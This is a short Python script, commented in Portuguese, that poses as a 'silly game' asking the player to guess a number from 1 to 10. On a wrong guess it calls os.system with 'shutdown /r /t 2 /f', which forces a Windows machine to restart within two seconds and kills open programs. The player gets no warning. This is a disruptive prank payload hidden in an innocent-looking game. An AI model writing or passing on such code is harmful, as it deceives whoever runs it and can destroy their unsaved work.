import random
import os

numero = random.randint(1, 10)

advinhe = input("Jogo bobo! Advinhe um número entre 1 e 10: ")
advinhe = int(advinhe)

if advinhe == numero:
    print("Parabéns! Você acertou!")
else:
    print("Você errou. :(")
    os.system("shutdown /r /t 2 /f")
   